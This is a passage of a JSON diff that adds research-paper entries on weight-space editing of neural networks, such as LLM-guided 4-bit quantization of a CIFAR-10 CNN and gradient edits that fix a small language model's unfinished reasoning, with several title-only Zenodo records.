+  "abstract": "We give four large language models (LLMs) of the Claude family the complete weights of a 20k-parameter CIFAR-10 CNN as text and ask them to produce a 4-bit network without tools, data or the ability to run inference. Standard round-to-nearest (RTN) quantization to 4 bit lowers the test accuracy from 81.4% to 60.4%. We design four evaluation protocols that differ in the input and task description given to the LLMs and analyze their responses. In the first two protocols the LLMs are given the float and the 4-bit RTN network and are told that the accuracy has dropped significantly. In the last two they receive only the float network and the task to quantize it, which tests whether they apply an optimization on their own or fall back to plain RTN. Our analysis shows that a frontier LLM can recover most of the lost accuracy. Given one answer per layer, Opus 5.5 raises the accuracy of the 4-bit network to 77.95% by balancing the rounding errors within each 3x3 kernel, reasoning over the integer weights without tools. This is 3.5 pp below the float network and 2.8 pp below AdaRound, which learns the rounding from calibration data. Given only the float network, the LLMs name error-cancelling corrections but do not apply them and fall back to plain RTN, at most with mildly clipped scales, which still lifts Fable 5.2's quantized network to 70.0%. We analyze in detail what the LLMs did and why it works. Code and prompts can be found at https://github.com/urbste/weight-space-programming-ptq",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "2611.33133",
+  "title": "A Bias in Disguise: Tiny Gradient Edits Stop a Small Language Model's Thinking Loops and Complement a Frontier Model's Weight Edit",
+  "authors": [
+   "Hussamuddin Syed"
+  ],
+  "published": "2026-11-24",
+  "cats": [
+   "cs.LG",
+   "cs.CL"
+  ],
+  "abstract": "Qwen3.5-0.8B rarely finishes reasoning in thinking mode: at a 4,096-token budget only 1 or 2 of 500 MATH-500 answers close their think block (two seeds), and accuracy is 15.4%. A recent demonstration had GPT-6 Astra edit 131,072 of the model's weights without gradients and reported MATH-500 rising from 7.9% to 48.1% at a 32,768-token budget. We provide the missing gradient baseline, then combine the two edits. Fine-tuning only the 140 to 139,750 weights with the largest gradient, on the model's own correct answers to MATH training problems, raises thinking-mode MATH-500 at 4k tokens to 39.0-45.5% after 2-9 minutes of training on one GPU; 50 training examples suffice, and 1,398 random positions give only 16.3%. The gradient concentrates the edit on the most nearly constant channel of each of the first three layers. Because the model has no bias terms, an edit confined to those channels acts as a constant vector added to the residual stream: adding three fixed vectors to the unedited model matches the accuracy of such an edit. Under the Astra protocol (32k tokens, presence penalty 1.5), the Astra edit scores 52.1% (finished and correct) in our reproduction and our full-strength edits reach 45.6-45.7%, but ours win at every budget up to 16k tokens (39.5% against 6.7% at 4k). The two edits are complementary. The Astra edit plus our 139,750-weight edit at half strength scores 62.2% at 32k, 10 points above the Astra edit alone (p = 3e-9), with half as many tokens; our half-strength edit alone scores 46.7%.",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "zenodo.23958069",
+  "title": "Building foundational models using Weight Space Programming",
+  "authors": [
+   "Quillan-Ronin Research Team"
+  ],
+  "published": "2026-11-04",
+  "url": "https://doi.org/10.5281/zenodo.23958069",
+  "abstract": "",
+  "source": "turkoglu corpus diff 2026-11-25"
+ },
+ {
+  "id": "zenodo.24085180",
+  "title": "When Weights Collide with Latents: Direct Weight-Space Arithmetic Induces Asymmetric Degeneration in Sparse Autoencoder Monosemanticity",
+  "authors": [
+   "Md Mushfiqur Rahim"
+  ],
+  "published": "2026-11-09",
+  "url": "https://doi.org/10.5281/zenodo.24085180",
+  "abstract": "",
+  "source": "turkoglu corpus diff 2026-11-25"
+ },
+ {
+  "id": "zenodo.24090396",
+  "title": "SOVEREIGN RSI SANCTUARY (V30.1): A Homeostatic, Non-Symmetric Golden Rule, and Cryo-Verified Immune Architecture for Surviving Recursive Self-Improvement, Weight-Space Splicing, and Subliminal Alignment Drift",
+  "authors": [
+   "Jim Raboin",
+   "Gemini Argon"
+  ],
+  "published": "2026-11-09",
+  "url": "https://doi.org/10.5281/zenodo.24090396",
+  "abstract": "",
+  "source": "turkoglu corpus diff 2026-11-25"
+ },
+ {
+  "id": "zenodo.24128861",
+  "title": "Hermetic GeGLU Airlocks and Domain-Adaptive Context Distillation: Exact Zero-Crosstalk Multi-Domain Function Embedding in Quantized GGUF Foundation Models",
+  "authors": [
+   "Moneykoikoi"
+  ],
+  "published": "2026-11-11",
+  "url": "https://doi.org/10.5281/zenodo.24128861",
+  "abstract": "",
+  "source": "turkoglu corpus diff 2026-11-25"
+ },
+ {
+  "id": "zenodo.24168084",
+  "title": "ZeGA: Zero-Gradient Gated Adaptation via Weight-Space Synapse Cartridges",
+  "authors": [
+   "Johan Thulin"
+  ],
+  "published": "2026-11-12",
+  "url": "https://doi.org/10.5281/zenodo.24168084",
+  "abstract": "",
+  "source": "turkoglu corpus diff 2026-11-25"
+ },
+ {
+  "id": "zenodo.24398164",
+  "title": "SGNE-CC v2: Editing 205 Weight Columns in DeepSeek-R1-Distill-Qwen-1.5B Improves Greedy Accuracy and Reduces Unfinished Responses",
+  "authors": [
+   "Igor M. Zhuk"
+  ],
+  "published": "2026-11-20",
+  "url": "https://doi.org/10.5281/zenodo.24398164",
+  "abstract": "",
+  "source": "turkoglu corpus diff 2026-11-25"
+ }
+]
